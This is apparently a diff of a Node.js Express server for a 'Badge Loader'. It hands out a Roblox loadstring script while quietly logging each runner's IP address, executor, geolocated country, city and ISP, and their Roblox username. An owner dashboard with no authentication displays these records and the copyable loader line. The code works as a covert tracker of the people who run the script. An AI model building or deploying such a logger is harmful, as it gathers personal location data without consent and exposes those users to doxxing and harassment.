@@ -7,13 +7,23 @@ const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch
 
 const app = express()
 
-// PUBLIC LOADER
+// CLEAN IP FUNCTION
+function cleanIP(ip){
+if(!ip) return "Unknown"
+if(ip.includes(",")) ip = ip.split(",")[0]
+if(ip.includes("::ffff:")) ip = ip.replace("::ffff:","")
+return ip.trim()
+}
+
+// LOADER
 app.get("/load", async (req,res)=>{
 
-const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress
+let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress
+ip = cleanIP(ip)
+
 const executor = req.headers["executor"] || "Unknown"
 
-// CLEAN MST TIME
+// MST TIME
 const time = new Date().toLocaleString("en-US", {
     timeZone: "America/Phoenix",
     hour12: true
@@ -27,12 +37,16 @@ try{
 const geo = await fetch(`http://ip-api.com/json/${ip}`)
 const data = await geo.json()
 
-country = data.country || "Unknown"
-city = data.city || "Unknown"
-isp = data.isp || "Unknown"
-}catch{}
+if(data.status === "success"){
+country = data.country
+city = data.city
+isp = data.isp
+}
+}catch{
+console.log("Geo lookup failed")
+}
 
-// insert log FIRST (username will update after)
+// insert first
 db.run(
 "INSERT INTO executions (ip, executor, time, country, city, isp, username) VALUES (?, ?, ?, ?, ?, ?, ?)",
 [ip, executor, time, country, city, isp, "Loading..."]
@@ -48,20 +62,30 @@ res.send(script)
 })
 
 
-// ROBLOX USERNAME LOGGER
+// USERNAME LOGGER
 app.get("/log", async (req,res)=>{
 
-const userid = req.query.userid || "Unknown"
+const userid = req.query.userid
 
-let username = "Unknown"
+if(!userid){
+res.send("no userid")
+return
+}
+
+let username="Unknown"
 
 try{
-const response = await fetch(`https://users.roblox.com/v1/users/${userid}`)
-const data = await response.json()
-username = data.name || "Unknown"
-}catch{}
+const r = await fetch(`https://users.roblox.com/v1/users/${userid}`)
+const data = await r.json()
 
-// update latest execution
+if(data && data.name){
+username = data.name
+}
+}catch{
+console.log("Roblox lookup failed")
+}
+
+// update latest row
 db.run(
 "UPDATE executions SET username=? WHERE id=(SELECT MAX(id) FROM executions)",
 [username]
@@ -72,23 +96,22 @@ res.send("ok")
 })
 
 
-// OWNER DASHBOARD
+// DASHBOARD
 app.get("/dashboard/owner",(req,res)=>{
 
 db.all("SELECT * FROM executions",(err,rows)=>{
 
 if(err){
-res.send("Database error")
+res.send("DB error")
 return
 }
 
-let logsHTML=""
+let logs=""
 
 rows.slice(-50).reverse().forEach(log=>{
-
-logsHTML+=`
+logs+=`
 <tr>
-<td>${log.username || "Loading..."}</td>
+<td>${log.username}</td>
 <td>${log.ip}</td>
 <td>${log.country}</td>
 <td>${log.city}</td>
@@ -96,69 +119,21 @@ logsHTML+=`
 <td>${log.time}</td>
 </tr>
 `
-
 })
 
 res.send(`
 <html>
-
 <head>
-
-<title>Badge Loader Dashboard</title>
+<title>Dashboard</title>
 
 <style>
-
-body{
-background:#020617;
-color:white;
-font-family:Arial;
-padding:40px;
-}
-
-h1{
-color:#38bdf8;
-}
-
-.card{
-background:#1e293b;
-padding:20px;
-border-radius:10px;
-margin-bottom:25px;
-}
-
-table{
-width:100%;
-border-collapse:collapse;
-}
-
-td,th{
-border:1px solid #334155;
-padding:10px;
-}
-
-th{
-background:#0f172a;
-}
-
-.loaderbox{
-background:#0f172a;
-padding:10px;
-border-radius:6px;
-font-family:monospace;
-margin-top:10px;
-word-break:break-all;
-}
-
-button{
-padding:10px 18px;
-border:none;
-border-radius:6px;
-background:#38bdf8;
-color:black;
-cursor:pointer;
-margin-top:10px;
-}
-
+body{background:#020617;color:white;font-family:Arial;padding:40px}
+.card{background:#1e293b;padding:20px;border-radius:10px;margin-bottom:20px}
+table{width:100%;border-collapse:collapse}
+td,th{border:1px solid #334155;padding:10px}
+th{background:#0f172a}
+.loaderbox{background:#0f172a;padding:10px;border-radius:6px;font-family:monospace}
+button{padding:10px;background:#38bdf8;border:none;border-radius:6px;margin-top:10px;cursor:pointer}
 </style>
 
 </head>
@@ -168,30 +143,23 @@ margin-top:10px;
 <h1>Badge Loader Dashboard</h1>
 
 <div class="card">
-<h2>Total Executions</h2>
-${rows.length}
+Total Executions: ${rows.length}
 </div>
 
-
 <div class="card">
-
-<h2>Loader Script</h2>
-
-<div class="loaderbox" id="loadertext">
+<h2>Loader</h2>
+<div class="loaderbox">
 loadstring(game:HttpGet("https://badge-loader-production.up.railway.app/load"))()
 </div>
-
-<button onclick="copyLoader()">Copy Loader</button>
-
+<button onclick="navigator.clipboard.writeText('loadstring(game:HttpGet(\\'https://badge-loader-production.up.railway.app/load\\'))()')">
+Copy
+</button>
 </div>
 
-
 <div class="card">
-
-<h2>Recent Executions</h2>
+<h2>Executions</h2>
 
 <table>
-
 <tr>
 <th>Username</th>
 <th>IP</th>
@@ -201,38 +169,21 @@ loadstring(game:HttpGet("https://badge-loader-production.up.railway.app/load"))(
 <th>Time</th>
 </tr>
 
-${logsHTML}
+${logs}
 
 </table>
 
 </div>
 
-
 <script>
-
-function copyLoader(){
-const text='loadstring(game:HttpGet("https://badge-loader-production.up.railway.app/load"))()'
-navigator.clipboard.writeText(text)
-alert("Copied!")
-}
-
-// auto refresh (live feel)
-setInterval(()=>{
-location.reload()
-},5000)
-
+setInterval(()=>location.reload(),5000)
 </script>
 
 </body>
-
 </html>
 `)
-
 })
 
 })
 
-
-app.listen(3000,()=>{
-console.log("Badge Loader running")
-})
+app.listen(3000,()=>console.log("Running"))
